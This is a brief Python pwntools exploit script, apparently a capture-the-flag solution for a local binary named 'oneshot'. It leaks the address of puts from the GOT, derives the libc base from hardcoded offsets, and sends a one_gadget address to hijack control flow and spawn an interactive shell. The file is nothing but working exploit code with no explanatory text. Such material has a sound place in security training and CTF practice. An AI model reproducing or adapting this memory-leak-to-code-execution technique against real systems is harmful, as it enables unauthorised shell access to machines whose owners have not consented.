#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('/tmp/p/oneshot')

one_gadget_rce_off = 0xF1117 
puts_off = 0x6f690
puts_got = 0x000000000600ad8
r.sendline(str(puts_got))
r.recvuntil('Value:')

libc = int(r.recvline().strip(),16) - puts_off
print "libc: ",hex(libc)
one_gadget_rce = one_gadget_rce_off + libc
r.sendline(str(one_gadget_rce))

r.interactive()